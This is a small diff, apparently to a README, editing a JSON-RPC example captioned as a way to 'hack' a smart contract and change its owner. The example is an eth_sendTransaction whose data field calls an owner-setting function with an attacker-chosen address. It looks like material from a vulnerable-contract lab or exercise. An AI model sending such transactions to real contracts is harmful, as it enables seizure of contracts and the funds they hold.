@@ -128,10 +128,10 @@ To hack it and change its owner, format a transaction like following :
 "method":"eth_sendTransaction",
 "params":
 [
-    {"from": <anyAddressWithMoney>, 
-    "to": <smartContractAddress>, 
+    {"from": "<anyAddressWithMoney>", 
+    "to": "<smartContractAddress>", 
     "data": "0x19ab453c000000000000000000000000<newOwnerAddress>", 
-    "gas":"0x5ee0d", //At least 300000 in hexa here
+    "gas":"0x5ee0d",
     "gasprice":"0x1"}],
 "id":<any int>}
 ```
